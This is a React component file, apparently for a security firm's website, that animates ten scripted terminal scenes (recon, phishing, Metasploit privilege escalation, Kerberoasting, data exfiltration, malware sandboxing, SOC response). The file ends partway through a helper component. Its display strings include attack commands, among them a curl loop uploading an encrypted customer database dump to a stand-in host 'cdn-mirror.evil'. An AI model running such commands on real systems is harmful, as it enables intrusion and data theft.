import { useEffect, useMemo, useRef, useState } from "react";
import {
  Shield, Terminal, Bug, Radar, Lock, Activity, Wifi, Skull,
  Fish, GitBranch, Database, FileWarning, Zap, Search,
  Play, Pause, SkipBack, SkipForward, Volume2, VolumeX, AlertTriangle,
} from "lucide-react";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Badge } from "@/components/ui/badge";

/* ------------------------------------------------------------------ */
/*  Matrix rain background                                             */
/* ------------------------------------------------------------------ */
export function MatrixRain({ className = "", opacity = 0.35 }: { className?: string; opacity?: number }) {
  const ref = useRef<HTMLCanvasElement>(null);
  useEffect(() => {
    const canvas = ref.current!;
    const ctx = canvas.getContext("2d")!;
    let raf = 0;
    const chars = "01ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ<>#%$*+-=_/\\|".split("");
    let cols = 0, drops: number[] = [];
    const resize = () => {
      const dpr = Math.min(window.devicePixelRatio || 1, 2);
      canvas.width = canvas.offsetWidth * dpr;
      canvas.height = canvas.offsetHeight * dpr;
      ctx.scale(dpr, dpr);
      cols = Math.floor(canvas.offsetWidth / 14);
      drops = Array(cols).fill(0).map(() => Math.random() * -50);
    };
    resize();
    window.addEventListener("resize", resize);
    let last = 0;
    const draw = (t: number) => {
      if (t - last > 55) {
        last = t;
        ctx.fillStyle = "rgba(0,0,0,0.08)";
        ctx.fillRect(0, 0, canvas.offsetWidth, canvas.offsetHeight);
        ctx.font = "13px 'JetBrains Mono', monospace";
        for (let i = 0; i < cols; i++) {
          const ch = chars[(Math.random() * chars.length) | 0];
          const x = i * 14;
          const y = drops[i] * 16;
          ctx.fillStyle = Math.random() > 0.975 ? "#ffffff" : "hsl(0 85% 55%)";
          ctx.fillText(ch, x, y);
          if (y > canvas.offsetHeight && Math.random() > 0.965) drops[i] = 0;
          drops[i]++;
        }
      }
      raf = requestAnimationFrame(draw);
    };
    raf = requestAnimationFrame(draw);
    return () => { cancelAnimationFrame(raf); window.removeEventListener("resize", resize); };
  }, []);
  return <canvas ref={ref} className={className} style={{ opacity }} />;
}

/* ------------------------------------------------------------------ */
/*  Audio engine — WebAudio synthesized SFX + ambient drone            */
/* ------------------------------------------------------------------ */
class OpsAudio {
  ctx: AudioContext | null = null;
  master: GainNode | null = null;
  ambient: { stop: () => void } | null = null;
  enabled = false;

  ensure() {
    if (this.ctx) return;
    const AC = (window.AudioContext || (window as any).webkitAudioContext);
    if (!AC) return;
    this.ctx = new AC();
    this.master = this.ctx.createGain();
    this.master.gain.value = 0.25;
    this.master.connect(this.ctx.destination);
  }

  async enable() {
    this.ensure();
    if (!this.ctx) return;
    if (this.ctx.state === "suspended") await this.ctx.resume();
    this.enabled = true;
    this.startAmbient();
  }
  disable() {
    this.enabled = false;
    this.stopAmbient();
  }

  private startAmbient() {
    if (!this.ctx || !this.master || this.ambient) return;
    const ctx = this.ctx;
    // Two detuned low sines + slow LFO for a cinematic drone
    const g = ctx.createGain();
    g.gain.value = 0;
    g.gain.linearRampToValueAtTime(0.12, ctx.currentTime + 1.2);
    g.connect(this.master);

    const o1 = ctx.createOscillator(); o1.type = "sine"; o1.frequency.value = 55;
    const o2 = ctx.createOscillator(); o2.type = "sine"; o2.frequency.value = 82.4;
    const o3 = ctx.createOscillator(); o3.type = "sawtooth"; o3.frequency.value = 27.5;
    const lp = ctx.createBiquadFilter(); lp.type = "lowpass"; lp.frequency.value = 420;

    // slow LFO modulating filter cutoff for movement
    const lfo = ctx.createOscillator(); lfo.frequency.value = 0.08;
    const lfoGain = ctx.createGain(); lfoGain.gain.value = 120;
    lfo.connect(lfoGain).connect(lp.frequency);

    o1.connect(lp); o2.connect(lp); o3.connect(lp);
    lp.connect(g);
    [o1, o2, o3, lfo].forEach(n => n.start());

    this.ambient = {
      stop: () => {
        try {
          g.gain.cancelScheduledValues(ctx.currentTime);
          g.gain.linearRampToValueAtTime(0, ctx.currentTime + 0.4);
          setTimeout(() => { [o1, o2, o3, lfo].forEach(n => { try { n.stop(); } catch {} }); }, 500);
        } catch {}
      },
    };
  }
  private stopAmbient() { this.ambient?.stop(); this.ambient = null; }

  private beep(freq: number, dur: number, type: OscillatorType = "square", gain = 0.2) {
    if (!this.enabled || !this.ctx || !this.master) return;
    const ctx = this.ctx;
    const o = ctx.createOscillator(); o.type = type; o.frequency.value = freq;
    const g = ctx.createGain();
    g.gain.setValueAtTime(0, ctx.currentTime);
    g.gain.linearRampToValueAtTime(gain, ctx.currentTime + 0.01);
    g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + dur);
    o.connect(g).connect(this.master);
    o.start();
    o.stop(ctx.currentTime + dur + 0.02);
  }

  sceneSwitch() {
    this.beep(880, 0.08, "triangle");
    setTimeout(() => this.beep(1320, 0.09, "triangle"), 70);
  }
  key() { this.beep(1600 + Math.random() * 400, 0.02, "square", 0.06); }
  radar() { this.beep(660, 0.05, "sine", 0.09); }
  rootAlert() {
    this.beep(220, 0.15, "sawtooth", 0.28);
    setTimeout(() => this.beep(180, 0.15, "sawtooth", 0.28), 130);
    setTimeout(() => this.beep(140, 0.35, "sawtooth", 0.3), 260);
  }
  alertClick() { this.beep(520, 0.05, "square", 0.15); }
}

/* ------------------------------------------------------------------ */
/*  Scene data                                                         */
/* ------------------------------------------------------------------ */
type Severity = "critical" | "high" | "medium" | "info";
type Scene = {
  key: string;
  title: string;
  Icon: typeof Shield;
  tag: string;
  color: string;
  accent: string; // tailwind bg for HUD accent
  severity: Severity;
  incident: {
    id: string;
    summary: string;
    mitre: string[];
    impact: string;
    actions: string[];
    outcome: string;
  };
  lines: { t: string; c?: string; alert?: boolean; root?: boolean }[];
};

const SCENES: Scene[] = [
  {
    key: "recon", title: "RECON // Target Enumeration", Icon: Radar, tag: "OFFENSIVE",
    color: "text-cyan-400", accent: "bg-cyan-500", severity: "info",
    incident: {
      id: "OPS-2026-0001", summary: "Authorized external reconnaissance against client perimeter.",
      mitre: ["T1595 Active Scanning", "T1590 Gather Victim Network Info"],
      impact: "No impact — passive/authorized scan under signed SoW.",
      actions: ["Rate-limit scans to avoid IDS trip", "Fingerprint TLS + banner grab", "Enumerate DNS + subdomains"],
      outcome: "12 open ports, 4 hosts, attack surface report delivered.",
    },
    lines: [
      { t: "$ nmap -sS -sV -T4 -A -p- 10.10.14.23", c: "text-emerald-400" },
      { t: "Starting Nmap 7.94 at 2026-07-02 03:14 IST" },
      { t: "Discovered open port 22/tcp   ssh    OpenSSH 8.2" },
      { t: "Discovered open port 80/tcp   http   Apache 2.4.41" },
      { t: "Discovered open port 443/tcp  https  ssl/http" },
      { t: "Discovered open port 3306/tcp mysql  MySQL 5.7" },
      { t: "[+] OS fingerprint: Linux 5.4 (Ubuntu 20.04)", c: "text-cyan-300" },
      { t: "[*] 4 hosts up, 12 ports open — pivoting…", c: "text-muted-foreground" },
    ],
  },
  {
    key: "phish", title: "PHISHING // Payload Delivery", Icon: Fish, tag: "SOCIAL ENG",
    color: "text-fuchsia-400", accent: "bg-fuchsia-500", severity: "high",
    incident: {
      id: "OPS-2026-0044", summary: "Simulated spear-phishing campaign targeting finance dept.",
      mitre: ["T1566.001 Spearphishing Attachment", "T1204 User Execution"],
      impact: "3 of 42 users detonated payload → beacon call-back on sandbox.",
      actions: ["Serve payload from typosquat domain", "OAuth consent-phish page", "Track click + open + submit"],
      outcome: "Awareness training assigned; MFA enforced on all clickers.",
    },
    lines: [
      { t: "$ gophish --campaign 'Q3-Invoice-Update'", c: "text-emerald-400" },
      { t: "[+] SMTP relay OK · 42 targets loaded" },
      { t: "[→] Sending: hr-payroll@acme-corp.co (typosquat)" },
      { t: "[*] Landing page: consent-oauth login clone", c: "text-amber-300" },
      { t: "[✓] click  · user=alice.k  · 09:14:22" },
      { t: "[✓] open   · user=bob.p    · 09:15:07" },
      { t: "[!] SUBMIT · creds captured · user=alice.k", c: "text-red-400", alert: true },
      { t: "[+] 3/42 submitted · CTR 7.1% · report queued", c: "text-fuchsia-300" },
    ],
  },
  {
    key: "exploit", title: "EXPLOIT // Gaining Root Access", Icon: Skull, tag: "PRIV ESC",
    color: "text-red-400", accent: "bg-red-500", severity: "critical",
    incident: {
      id: "OPS-2026-0102", summary: "Chained Apache RCE → local pkexec (CVE-2021-4034) to root.",
      mitre: ["T1190 Exploit Public-Facing App", "T1068 Exploitation for Privilege Escalation"],
      impact: "Full root on jump host; lateral movement possible.",
      actions: ["Reverse TCP meterpreter", "Bypass SELinux permissive", "Establish persistence via cron"],
      outcome: "CVSS 9.8 report filed; patch + AppArmor policy shipped.",
    },
    lines: [
      { t: "$ msfconsole -q -x 'use exploit/multi/http/apache_normalize_path_rce'", c: "text-emerald-400" },
      { t: "[*] Started reverse TCP handler on 10.10.14.23:4444" },
      { t: "[*] Sending payload → 302 bytes", c: "text-amber-300" },
      { t: "[+] Meterpreter session 1 opened", c: "text-emerald-300" },
      { t: "meterpreter > getuid", c: "text-emerald-400" },
      { t: "Server username: www-data" },
      { t: "meterpreter > exploit/linux/local/pkexec", c: "text-emerald-400" },
      { t: "[+] uid=0(root) gid=0(root) groups=0(root)", c: "text-red-400" },
      { t: "▓▓▓ ROOT ACCESS GRANTED ▓▓▓", c: "text-red-500 font-bold", root: true, alert: true },
    ],
  },
  {
    key: "lateral", title: "LATERAL // Domain Traversal", Icon: GitBranch, tag: "MOVEMENT",
    color: "text-orange-400", accent: "bg-orange-500", severity: "high",
    incident: {
      id: "OPS-2026-0117", summary: "Kerberoasting + PSExec pivot across Windows domain.",
      mitre: ["T1558.003 Kerberoasting", "T1021.002 SMB/Windows Admin Shares"],
      impact: "Reached DC01 with cached DA hash from svc_backup.",
      actions: ["Request SPN TGS tickets", "Crack hash offline (hashcat)", "PSExec to DC with recovered hash"],
      outcome: "Rotated svc accounts, enforced 25-char passwords, enabled AES-only.",
    },
    lines: [
      { t: "$ GetUserSPNs.py acme.local/guest -dc-ip 10.0.0.10", c: "text-emerald-400" },
      { t: "[+] 6 SPN tickets extracted", c: "text-cyan-300" },
      { t: "$ hashcat -m 13100 tgs.hash rockyou.txt", c: "text-emerald-400" },
      { t: "svc_backup:P@ssw0rd_Winter24! → CRACKED", c: "text-orange-300" },
      { t: "$ psexec.py acme/svc_backup@10.0.0.10 -hashes ...", c: "text-emerald-400" },
      { t: "[+] SMB session established · SYSTEM on DC01", c: "text-red-400", alert: true },
      { t: "C:\\> whoami /groups → Domain Admins ✓", c: "text-red-400" },
    ],
  },
  {
    key: "exfil", title: "EXFIL // Data Extraction", Icon: Database, tag: "IMPACT",
    color: "text-purple-400", accent: "bg-purple-500", severity: "critical",
    incident: {
      id: "OPS-2026-0121", summary: "Staged and exfiltrated 2.4 GB to attacker-controlled S3.",
      mitre: ["T1048.003 Exfil Over Unencrypted Non-C2", "T1567.002 Cloud Storage"],
      impact: "Sensitive PII of 12k records staged (test data, sim only).",
      actions: ["Compress + AES-256 encrypt", "Chunk over HTTPS to evade DLP", "Rotate egress endpoints"],
      outcome: "DLP rule updated; egress allowlist enforced; CASB alert wired.",
    },
    lines: [
      { t: "$ tar czf - /var/lib/mysql/customers | openssl enc -aes-256-cbc -k $K | split -b 50M - part_", c: "text-emerald-400" },
      { t: "[+] 48 chunks produced · 2.4 GB total", c: "text-purple-300" },
      { t: "$ for f in part_*; do curl -T $f https://cdn-mirror.evil/$f; done", c: "text-emerald-400" },
      { t: "[→] 12% · 24% · 47% · 68% · 91% · 100%", c: "text-amber-300" },
      { t: "[!] DLP tripped on chunk 39 → auto-throttled", c: "text-red-400", alert: true },
      { t: "[+] Exfil complete · MD5 verified · beacon sleep 6h", c: "text-purple-400" },
    ],
  },
  {
    key: "malware", title: "MALWARE // Sandbox Detonation", Icon: Bug, tag: "REVERSING",
    color: "text-lime-400", accent: "bg-lime-500", severity: "high",
    incident: {
      id: "OPS-2026-0130", summary: "Dynamic analysis of suspicious invoice.docm dropper.",
      mitre: ["T1204.002 Malicious File", "T1059.005 VBA Scripting"],
      impact: "Cobalt Strike beacon staged; blocked at sandbox boundary.",
      actions: ["Extract IOCs · C2 domains · hashes", "Yara rule authored", "Threat intel pushed to EDR"],
      outcome: "12 domains sinkholed; 4 IPs blocked at edge FW.",
    },
    lines: [
      { t: "$ cuckoo submit invoice_Q3.docm", c: "text-emerald-400" },
      { t: "[*] VBA macros: 3 · autoexec=Document_Open" },
      { t: "[*] Spawned: powershell.exe -enc <base64>", c: "text-amber-300" },
      { t: "[*] Network: cdn-update[.]xyz  → 185.220.101.44" },
      { t: "[*] Dropped: %APPDATA%\\ms-update.exe (SHA256:9f2…)" },
      { t: "[!] Beacon detected · Cobalt Strike · watermark=305419896", c: "text-red-400", alert: true },
      { t: "[+] Yara rule 'CS_stager_2026_07' committed → EDR", c: "text-lime-300" },
    ],
  },
  {
    key: "soc", title: "SOC // Incident Response", Icon: Activity, tag: "BLUE TEAM",
    color: "text-emerald-400", accent: "bg-emerald-500", severity: "high",
    incident: {
      id: "IR-2026-0417", summary: "Brute-force against admin portal from single ASN.",
      mitre: ["T1110.001 Password Guessing", "T1078 Valid Accounts"],
      impact: "27 failed logins in 42s; no successful auth.",
      actions: ["Isolate host at switch", "Block source at edge FW", "Force credential rotation"],
      outcome: "Contained in 3m 12s. Post-mortem shared, playbook updated.",
    },
    lines: [
      { t: "[SIEM] ALERT · severity=HIGH · rule=T1078", c: "text-red-400", alert: true },
      { t: "→ src=203.0.113.44  dst=10.0.0.12  user=admin  fails=27" },
      { t: "$ splunk search 'index=auth failure user=admin | stats count'", c: "text-emerald-300" },
      { t: "count=27 in 42s → brute-force pattern confirmed", c: "text-amber-300" },
      { t: "[ACTION] isolate host · block 203.0.113.44 at edge FW", c: "text-cyan-300" },
      { t: "[ACTION] force-reset admin credentials · rotate keys", c: "text-cyan-300" },
      { t: "[+] Incident IR-2026-0417 → CONTAINED (MTTR 3m 12s)", c: "text-emerald-400" },
    ],
  },
  {
    key: "hunt", title: "THREAT HUNT // Beacon Discovery", Icon: Search, tag: "PROACTIVE",
    color: "text-teal-400", accent: "bg-teal-500", severity: "medium",
    incident: {
      id: "TH-2026-0212", summary: "Hunt for periodic beacon traffic across 30-day telemetry.",
      mitre: ["T1071.001 App Layer Protocol: Web", "T1029 Scheduled Transfer"],
      impact: "1 endpoint confirmed beaconing every 62s to CDN edge.",
      actions: ["Kusto query on ProxyLogs", "Compute jitter + interval std-dev", "Pivot to EDR process tree"],
      outcome: "Endpoint reimaged; IOC pushed to global watchlist.",
    },
    lines: [
      { t: "// KQL — proactive hunt", c: "text-muted-foreground" },
      { t: "ProxyLogs | where TimeGenerated > ago(30d)", c: "text-teal-300" },
      { t: "| summarize c=count(), s=stdev(dt) by SrcIp, Domain", c: "text-teal-300" },
      { t: "| where s < 4 and c > 500", c: "text-teal-300" },
      { t: "[→] hit: 10.0.4.22 → cdn-static[.]net  (σ=2.1s, n=1240)", c: "text-amber-300" },
      { t: "[!] beacon confirmed · interval ≈ 62s ± 2s", c: "text-red-400", alert: true },
      { t: "[+] host quarantined · IOC → global watchlist", c: "text-teal-400" },
    ],
  },
  {
    key: "ddos", title: "DDoS // Edge Mitigation", Icon: Zap, tag: "DEFENSE",
    color: "text-yellow-400", accent: "bg-yellow-500", severity: "high",
    incident: {
      id: "IR-2026-0518", summary: "Volumetric UDP flood spikes to 84 Gbps on public edge.",
      mitre: ["T1498.001 Direct Network Flood"],
      impact: "Latency +340ms for 90s before scrubbing kicked in.",
      actions: ["Anycast BGP announce", "Enable Magic Transit scrubbing", "Rate-limit UDP at edge"],
      outcome: "Absorbed within 90s; capacity report shared with leadership.",
    },
    lines: [
      { t: "[EDGE] traffic 12 → 84 Gbps in 8s", c: "text-yellow-300" },
      { t: "[!] SYN/UDP ratio anomalous · likely volumetric flood", c: "text-red-400", alert: true },
      { t: "$ announce-bgp --prefix 203.0.113.0/24 --scrubbing on", c: "text-emerald-400" },
      { t: "[✓] Anycast rerouted via 4 scrubbing centers" },
      { t: "[✓] UDP amplification signatures dropped at edge" },
      { t: "[+] p95 latency restored · 12ms (from 350ms)", c: "text-yellow-400" },
    ],
  },
  {
    key: "vapt", title: "VAPT // Report Generation", Icon: FileWarning, tag: "ASSESSMENT",
    color: "text-amber-400", accent: "bg-amber-500", severity: "critical",
    incident: {
      id: "VAPT-2026-Q3", summary: "Full-scope web + API assessment for ACME Corp.",
      mitre: ["T1190", "T1552", "T1078"],
      impact: "1 critical SQLi provides DB read; 2 high JWT/XSS chains.",
      actions: ["PoC exploit for each finding", "Remediation guidance + code refs", "Retest window scheduled"],
      outcome: "15 findings, PGP-signed PDF, exec + technical decks delivered.",
    },
    lines: [
      { t: "$ ./vapt-report --client acme --scope web,api", c: "text-emerald-400" },
      { t: "[✓] CRITICAL  SQLi in /api/v1/users?id=  (CVSS 9.8)", c: "text-red-400", alert: true },
      { t: "[✓] HIGH      Broken auth · JWT alg=none  (CVSS 8.1)", c: "text-red-300" },
      { t: "[✓] HIGH      Stored XSS in comment renderer  (CVSS 7.4)", c: "text-red-300" },
      { t: "[✓] MEDIUM    IDOR on /orders/{id}  (CVSS 6.5)", c: "text-amber-300" },
      { t: "[✓] LOW       Missing security headers  (CVSS 3.1)", c: "text-yellow-300" },
      { t: "[+] 15 findings · PDF exported · signed with PGP", c: "text-emerald-400" },
    ],
  },
];

const LINE_MS = 260;
const HOLD_MS = 2200;

/* ------------------------------------------------------------------ */
/*  Main component                                                     */
/* ------------------------------------------------------------------ */
export function CinematicOps() {
  const [idx, setIdx] = useState(0);
  const [shown, setShown] = useState(0);
  const [playing, setPlaying] = useState(true);
  const [muted, setMuted] = useState(true);
  const [modalOpen, setModalOpen] = useState(false);
  const [modalScene, setModalScene] = useState<Scene | null>(null);
  const audio = useMemo(() => new OpsAudio(), []);
  const termRef = useRef<HTMLDivElement>(null);

  // Advance lines
  useEffect(() => {
    if (!playing) return;
    const scene = SCENES[idx];
    if (shown >= scene.lines.length) {
      const t = setTimeout(() => {
        setIdx((p) => (p + 1) % SCENES.length);
      }, HOLD_MS);
      return () => clearTimeout(t);
    }
    const t = setTimeout(() => {
      const nextLine = scene.lines[shown];
      if (!muted) {
        audio.key();
        if (nextLine.root) audio.rootAlert();
        else if (nextLine.alert) audio.alertClick();
      }
      setShown((s) => s + 1);
    }, LINE_MS);
    return () => clearTimeout(t);
  }, [playing, shown, idx, muted, audio]);

  // Reset lines on scene change
  useEffect(() => {
    setShown(0);
    if (!muted) audio.sceneSwitch();
    // scroll to bottom of terminal
    requestAnimationFrame(() => termRef.current?.scrollTo({ top: 0 }));
  }, [idx, muted, audio]);

  // Radar tick sound
  useEffect(() => {
    if (muted) return;
    const iv = setInterval(() => audio.radar(), 2400);
    return () => clearInterval(iv);
  }, [muted, audio]);

  const toggleMute = async () => {
    if (muted) { await audio.enable(); setMuted(false); }
    else { audio.disable(); setMuted(true); }
  };

  const scene = SCENES[idx];
  const Icon = scene.Icon;
  const progress = Math.min(1, shown / scene.lines.length);

  const openIncident = (s: Scene) => {
    if (!muted) audio.alertClick();
    setModalScene(s);
    setModalOpen(true);
  };

  return (
    <section id="live-ops" className="relative border-t border-border/60 overflow-hidden">
      <MatrixRain className="absolute inset-0 w-full h-full" opacity={0.18} />
      <div className="absolute inset-0 bg-gradient-to-b from-background via-background/70 to-background pointer-events-none" />

      <div className="relative mx-auto max-w-7xl px-6 py-24">
        {/* Section head */}
        <div className="flex items-end justify-between flex-wrap gap-4 mb-6">
          <div>
            <p className="font-mono text-xs text-primary uppercase tracking-widest flex items-center gap-2">
              <span className="h-1.5 w-1.5 rounded-full bg-red-500 animate-pulse" />
              // live ops · cinematic ops room
            </p>
            <h2 className="mt-3 text-3xl md:text-4xl font-bold">Watch the ops room in motion.</h2>
            <p className="mt-2 text-muted-foreground max-w-2xl">
              10 scenes on loop — recon, phishing, exploit, lateral movement, exfil, malware,
              SOC, threat hunt, DDoS, and VAPT reporting. Click any red alert to open the incident brief.
            </p>
          </div>
          <div className="flex items-center gap-2 font-mono text-xs">
            <ControlBtn onClick={() => { setIdx((idx - 1 + SCENES.length) % SCENES.length); }} label="Previous scene">
              <SkipBack className="h-3.5 w-3.5" />
            </ControlBtn>
            <ControlBtn onClick={() => setPlaying(p => !p)} label={playing ? "Pause" : "Play"} active={playing}>
              {playing ? <Pause className="h-3.5 w-3.5" /> : <Play className="h-3.5 w-3.5" />}
            </ControlBtn>
            <ControlBtn onClick={() => { setIdx((idx + 1) % SCENES.length); }} label="Next scene">
              <SkipForward className="h-3.5 w-3.5" />
            </ControlBtn>
            <ControlBtn onClick={toggleMute} label={muted ? "Enable audio" : "Mute audio"} active={!muted}>
              {muted ? <VolumeX className="h-3.5 w-3.5" /> : <Volume2 className="h-3.5 w-3.5" />}
            </ControlBtn>
          </div>
        </div>

        {/* Scrubber */}
        <div className="mb-6">
          <div className="flex flex-wrap gap-1.5">
            {SCENES.map((s, i) => {
              const S = s.Icon;
              const active = i === idx;
              return (
                <button
                  key={s.key}
                  onClick={() => setIdx(i)}
                  className={`group relative flex-1 min-w-[60px] h-10 rounded-md border transition-all overflow-hidden ${
                    active ? "border-primary bg-primary/10 shadow-red" : "border-border bg-card/40 hover:border-primary/50"
                  }`}
                  aria-label={s.title}
                  title={s.title}
                >
                  <span className="absolute inset-0 flex items-center justify-center">
                    <S className={`h-3.5 w-3.5 ${active ? s.color : "text-muted-foreground group-hover:text-foreground"}`} />
                  </span>
                  {active && (
                    <span
                      className={`absolute bottom-0 left-0 h-0.5 ${s.accent}`}
                      style={{ width: `${progress * 100}%`, transition: "width 240ms linear" }}
                    />
                  )}
                </button>
              );
            })}
          </div>
        </div>

        {/* Body */}
        <div className="grid lg:grid-cols-5 gap-6">
          {/* Terminal */}
          <div className="lg:col-span-3 rounded-xl border border-primary/30 bg-black/85 backdrop-blur-sm shadow-glow overflow-hidden">
            <div className="h-9 bg-card/90 border-b border-border flex items-center px-3 gap-1.5">
              <span className="h-2.5 w-2.5 rounded-full bg-red-500/80" />
              <span className="h-2.5 w-2.5 rounded-full bg-amber-500/80" />
              <span className="h-2.5 w-2.5 rounded-full bg-emerald-500/80" />
              <span className="ml-auto font-mono text-[11px] text-muted-foreground flex items-center gap-2">
                <Icon className={`h-3.5 w-3.5 ${scene.color}`} />
                {scene.title}
              </span>
            </div>
            <div ref={termRef} className="p-5 font-mono text-[13px] leading-relaxed min-h-[360px] max-h-[360px] overflow-hidden relative">
              <div className="absolute inset-0 pointer-events-none opacity-[0.04]" style={{
                backgroundImage: "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255,255,255,0.15) 2px, rgba(255,255,255,0.15) 3px)",
              }} />
              {scene.lines.slice(0, shown).map((l, i) => (
                <div
                  key={`${scene.key}-${i}`}
                  className={`animate-fade-in ${l.c ?? "text-slate-300"} ${l.alert ? "cursor-pointer hover:brightness-125" : ""}`}
                  onClick={l.alert ? () => openIncident(scene) : undefined}
                  title={l.alert ? "Click for incident summary" : undefined}
                >
                  {l.alert && <AlertTriangle className="inline h-3 w-3 mr-1 -mt-0.5" />}
                  {l.t}
                </div>
              ))}
              {playing && shown < scene.lines.length && (
                <span className="inline-block w-2 h-4 bg-primary align-middle animate-pulse ml-0.5" />
              )}
              {!playing && (
                <div className="absolute top-2 right-3 font-mono text-[10px] text-amber-300 border border-amber-400/50 px-1.5 py-0.5 rounded bg-amber-400/10">PAUSED</div>
              )}
            </div>
          </div>

          {/* HUD panels */}
          <div className="lg:col-span-2 grid gap-4">
            <HudPanel title="Threat Level" tag={scene.tag} color={scene.color}>
              <div className="flex items-end gap-1 h-16">
                {Array.from({ length: 28 }).map((_, i) => (
                  <span
                    key={`${idx}-${i}`}
                    className={`flex-1 ${scene.accent} rounded-sm animate-pulse opacity-80`}
                    style={{
                      height: `${20 + Math.sin(i * 0.6 + idx) * 30 + Math.abs(Math.cos((i + idx) * 1.3)) * 40}%`,
                      animationDelay: `${i * 40}ms`,
                    }}
                  />
                ))}
              </div>
              <div className="mt-2 flex justify-between font-mono text-[10px] text-muted-foreground">
                <span>severity: <span className={scene.color}>{scene.severity.toUpperCase()}</span></span>
                <span>incident: {scene.incident.id}</span>
              </div>
            </HudPanel>

            <HudPanel title="Live Signals" tag="TELEMETRY" color="text-cyan-400">
              <ul className="space-y-1.5 font-mono text-[11px]">
                {[
                  { i: Wifi, t: `packet capture · ${(20 + idx * 1.7).toFixed(1)} MB/s`, c: "text-cyan-300" },
                  { i: Lock, t: "TLS handshake · x509 verified", c: "text-emerald-300" },
                  { i: Shield, t: `EDR agents · ${400 + idx * 3} online`, c: "text-emerald-300" },
                  { i: Terminal, t: `shell sessions · ${1 + (idx % 5)} active`, c: "text-amber-300" },
                ].map((r, i) => (
                  <li key={i} className={`flex items-center gap-2 ${r.c}`}>
                    <r.i className="h-3 w-3" />
                    <span>{r.t}</span>
                    <span className="ml-auto h-1.5 w-1.5 rounded-full bg-current animate-pulse" style={{ animationDelay: `${i * 200}ms` }} />
                  </li>
                ))}
              </ul>
            </HudPanel>

            <div className="grid grid-cols-2 gap-4">
              <HudPanel title="Radar" tag="SCAN" color="text-red-400">
                <div className="relative h-24 w-24 mx-auto rounded-full border border-primary/40">
                  <div className="absolute inset-2 rounded-full border border-primary/25" />
                  <div className="absolute inset-5 rounded-full border border-primary/15" />
                  <div className="absolute inset-0 rounded-full overflow-hidden">
                    <div
                      className="absolute top-1/2 left-1/2 h-1/2 w-1/2 origin-top-left"
                      style={{
                        background: "conic-gradient(from 0deg, hsl(0 85% 55% / 0.6), transparent 70%)",
                        animation: playing ? "radar-sweep 2.4s linear infinite" : "none",
                      }}
                    />
                  </div>
                  <span className="absolute top-1/2 left-1/2 h-1 w-1 -translate-x-1/2 -translate-y-1/2 rounded-full bg-primary shadow-red" />
                </div>
              </HudPanel>

              <HudPanel title="Incident" tag="OPEN" color={scene.color}>
                <button
                  onClick={() => openIncident(scene)}
                  className="w-full text-left group"
                >
                  <div className="font-mono text-[11px] text-muted-foreground">{scene.incident.id}</div>
                  <div className="mt-1 text-xs font-semibold group-hover:text-primary transition-colors line-clamp-2">
                    {scene.incident.summary}
                  </div>
                  <div className="mt-2 flex items-center gap-1 text-[10px] font-mono text-primary">
                    open brief <span aria-hidden>→</span>
                  </div>
                </button>
              </HudPanel>
            </div>
          </div>
        </div>

        {/* Now Playing bar */}
        <div className="mt-6 flex items-center gap-3 rounded-lg border border-border bg-card/60 backdrop-blur-sm px-4 py-2.5 font-mono text-[11px]">
          <span className={`h-2 w-2 rounded-full ${playing ? "bg-emerald-400 animate-pulse" : "bg-amber-400"}`} />
          <span className="text-muted-foreground">NOW PLAYING</span>
          <span className="text-foreground">{idx + 1}/{SCENES.length} · {scene.title}</span>
          <span className="ml-auto text-muted-foreground">
            audio: <span className={muted ? "text-muted-foreground" : "text-emerald-400"}>{muted ? "muted" : "live"}</span>
          </span>
        </div>
      </div>

      {/* Incident modal */}
      <Dialog open={modalOpen} onOpenChange={setModalOpen}>
        <DialogContent className="max-w-2xl bg-card/95 backdrop-blur border-primary/30">
          {modalScene && (
            <>
              <DialogHeader>
                <div className="flex items-center gap-2 font-mono text-[11px] text-muted-foreground">
                  <modalScene.Icon className={`h-3.5 w-3.5 ${modalScene.color}`} />
                  {modalScene.incident.id} · {modalScene.tag}
                  <Badge variant="outline" className={`ml-auto ${modalScene.color} border-current uppercase`}>
                    {modalScene.severity}
                  </Badge>
                </div>
                <DialogTitle className="text-xl mt-2">{modalScene.title}</DialogTitle>
                <DialogDescription className="text-sm leading-relaxed">
                  {modalScene.incident.summary}
                </DialogDescription>
              </DialogHeader>

              <div className="space-y-4 mt-2">
                <div>
                  <p className="font-mono text-[10px] uppercase tracking-widest text-muted-foreground mb-1.5">MITRE ATT&CK</p>
                  <div className="flex flex-wrap gap-1.5">
                    {modalScene.incident.mitre.map(m => (
                      <span key={m} className="text-[11px] font-mono px-2 py-0.5 rounded border border-primary/30 bg-primary/5 text-primary">{m}</span>
                    ))}
                  </div>
                </div>

                <div>
                  <p className="font-mono text-[10px] uppercase tracking-widest text-muted-foreground mb-1.5">Impact</p>
                  <p className="text-sm text-foreground/90">{modalScene.incident.impact}</p>
                </div>

                <div>
                  <p className="font-mono text-[10px] uppercase tracking-widest text-muted-foreground mb-1.5">Actions Taken</p>
                  <ul className="space-y-1">
                    {modalScene.incident.actions.map((a, i) => (
                      <li key={i} className="text-sm text-foreground/90 flex gap-2">
                        <span className={`${modalScene.color} font-mono`}>▸</span>
                        <span>{a}</span>
                      </li>
                    ))}
                  </ul>
                </div>

                <div className="rounded-md border border-emerald-500/30 bg-emerald-500/5 p-3">
                  <p className="font-mono text-[10px] uppercase tracking-widest text-emerald-400 mb-1">Outcome</p>
                  <p className="text-sm text-foreground/90">{modalScene.incident.outcome}</p>
                </div>
              </div>
            </>
          )}
        </DialogContent>
      </Dialog>

      <style>{`@keyframes radar-sweep{to{transform:rotate(360deg)}}`}</style>
    </section>
  );
}

/* ------------------------------------------------------------------ */
function ControlBtn({ children, onClick, label, active }: { children: React.ReactNode; onClick: () => void; label: string; active?: boolean }) {
  return (
    <button
      onClick={onClick}
      aria-label={label}
      title={label}
      className={`h-8 w-8 flex items-center justify-center rounded-md border transition-all ${
        active ? "border-primary bg-primary/15 text-primary shadow-red" : "border-border bg-card/60 text-muted-foreground hover:text-foreground hover:border-primary/50"
      }`}
    >
      {children}
    </button>
  );
}

function HudPanel({ title, tag, color, children }: { title: string; tag: string; color: string; children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-border bg-card/70 backdrop-blur-sm p-4">
      <div className="flex items-center justify-between mb-3">
